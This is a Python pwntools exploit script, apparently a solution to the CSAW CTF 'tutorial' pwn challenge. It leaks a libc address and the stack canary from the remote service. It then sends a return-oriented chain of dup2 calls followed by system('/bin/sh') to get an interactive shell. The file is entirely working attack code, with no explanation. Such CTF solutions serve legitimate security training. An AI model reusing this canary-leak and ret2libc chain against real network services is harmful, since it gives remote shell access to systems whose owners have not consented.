#!/usr/bin/python
from pwn import *

s = remote('pwn.chal.csaw.io', 8002)
libc = ELF('/root/CSAW/tutorial/libc-2.19.so')

puts_off = libc.symbols['puts']
system_off = libc.symbols['system'] 
dup2_off = libc.symbols['dup2']
pop_rdi_ret = 0x4012e3
pop_rsi_r15_ret = 0x4012e1

s.recvuntil('>')
s.sendline('1')
s.recvuntil('Reference:')
puts = int(s.recvuntil('>')[2:14], 16) + 1280

base = puts - puts_off
print 'libc base = ', hex(base)

system = base + system_off
dup2 = base + dup2_off
binsh = base + 0x17c8c3

s.sendline('2')
s.recvuntil('>')
s.sendline('A'*311)
rst = s.recvuntil('-Tutorial-')
canary = u64(rst[312:320])
print 'canary = ', hex(canary)

s.recvuntil('>')
s.sendline('2')
s.recvuntil('>')
s.sendline('A'*312 + p64(canary) + 'B'*8 +
           p64(pop_rsi_r15_ret) + p64(0x0) + p64(0xdeadbeef) + p64(dup2) +
           p64(pop_rsi_r15_ret) + p64(0x1) + p64(0xdeadbeef) + p64(dup2) +
           p64(pop_rdi_ret) + p64(binsh) + p64(system))

s.interactive()
